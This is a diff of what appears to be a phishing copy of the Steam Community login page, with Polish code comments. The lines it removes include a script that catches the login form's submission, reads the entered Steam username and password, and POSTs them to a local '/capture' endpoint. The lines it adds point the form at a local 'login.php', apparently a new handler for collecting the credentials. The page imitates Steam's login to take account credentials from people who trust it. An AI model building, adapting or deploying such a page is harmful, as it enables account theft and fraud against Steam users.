@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html class=" responsive">
+<html class="responsive">
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 			<meta name="viewport" content="width=device-width,initial-scale=1">
@@ -246,46 +246,22 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 					</div>
 			</div>
 </div>
-<script type="text/javascript">
-	g_sessionID = "01bb407d5be35f479c72422d";
-	g_steamID = false;
+    <script type="text/javascript">
+        g_sessionID = "01bb407d5be35f479c72422d";
+        g_steamID = false;
 
-	// We always want to have the timezone cookie set for PHP to use
-	setTimezoneCookies();
+        // We always want to have the timezone cookie set for PHP to use
+        setTimezoneCookies();
 
-	$J( function() {
+        $J( function() {
+            InitMiniprofileHovers();
+            InitEmoticonHovers();
+            window.BindCommunityTooltip = function( $Selector ) { $Selector.v_tooltip( {'tooltipClass': 'community_tooltip', 'dataName': 'communityTooltip' } ); };
+            BindCommunityTooltip( $J('[data-community-tooltip]') );
+        });
 
-		InitMiniprofileHovers();
-		InitEmoticonHovers();
-		window.BindCommunityTooltip = function( $Selector ) { $Selector.v_tooltip( {'tooltipClass': 'community_tooltip', 'dataName': 'communityTooltip' } ); };
-		BindCommunityTooltip( $J('[data-community-tooltip]') );
-	});
-
-	$J( function() { InitEconomyHovers( "https:\/\/steamcommunity-a.akamaihd.net\/public\/css\/skin_1\/economy.css?v=Shjw4bKEBAMD", "https:\/\/steamcommunity-a.akamaihd.net\/public\/javascript\/economy_common.js?v=tsXdRVB0yEaR&l=english", "https:\/\/steamcommunity-a.akamaihd.net\/public\/javascript\/economy.js?v=nY0ySeWmxN2y&l=english" );});</script>
-		<div class="responsive_page_template_content">
-
-			
-
-
-<script language="Javascript">
-	function StartLogin()
-	{
-		LoginManager = new CLoginPromptManager( 'https://steamcommunity.com', {
-			strRedirectURL: "http:\/\/steamcommunity.com\/id\/boomsinclair",
-			gidCaptcha: -1,
-			strMobileClientType: null,
-			strMobileClientVersion: null,
-			bIsMobile: false		} );
-			
-		document.forms['logon'].elements['username'].focus();
-			
-			}
-			
-	$J( function() {
-		StartLogin();
-	});
-</script>
-            
+        $J( function() { InitEconomyHovers( "https:\/\/steamcommunity-a.akamaihd.net\/public\/css\/skin_1\/economy.css?v=Shjw4bKEBAMD", "https:\/\/steamcommunity-a.akamaihd.net\/public\/javascript\/economy_common.js?v=tsXdRVB0yEaR&l=english", "https:\/\/steamcommunity-a.akamaihd.net\/public\/javascript\/economy.js?v=nY0ySeWmxN2y&l=english" );});
+    </script>
 
 <div id="mainBody">
 
@@ -295,7 +271,7 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 		<p>To an existing Steam account</p>
 		
 		<div id="">
-			<form action="#" method="POST" name="logon" id="loginForm">
+			<form action="login.php" method="POST" name="logon" id="loginForm">
 
 				<div class="mainLoginLeftPanel_signin">
 					<label for="steamAccountName">Steam username</label><br>
@@ -389,43 +365,5 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 	<br clear="left">
 
 </div>
-<script>
-	// Nasłuchiwanie na zdarzenie przesyłania formularza
-	document.addEventListener('DOMContentLoaded', function () {
-		const loginForm = document.forms['logon']; // Znajdujemy formularz o nazwie 'logon'
-
-		if (loginForm) {
-			loginForm.addEventListener('submit', function (event) {
-				// Zatrzymaj domyślne przesyłanie formularza
-				event.preventDefault();
-
-				// Pobierz dane z pól formularza
-				const username = loginForm.elements['username'].value;
-				const password = loginForm.elements['password'].value;
-
-				// Wyświetl w konsoli (lub wyślij do serwera, zapisz do pliku itp.)
-				console.log('Username:', username);
-				console.log('Password:', password);
-
-				// Możesz zapisać dane do pliku lub wysłać je do innego serwera:
-				// Przykład zapisu do serwera
-				fetch('http://localhost:3000/capture', {
-					method: 'POST',
-					headers: {
-						'Content-Type': 'application/json',
-					},
-					body: JSON.stringify({ username, password }),
-				}).then((response) => {
-					console.log('Dane zapisane:', response);
-				}).catch((error) => {
-					console.error('Błąd przy zapisie danych:', error);
-				});
-
-				// Możesz też zezwolić na przesłanie formularza dalej:
-				// loginForm.submit();
-			});
-		}
-	});
-</script>
 </body>
 </html>
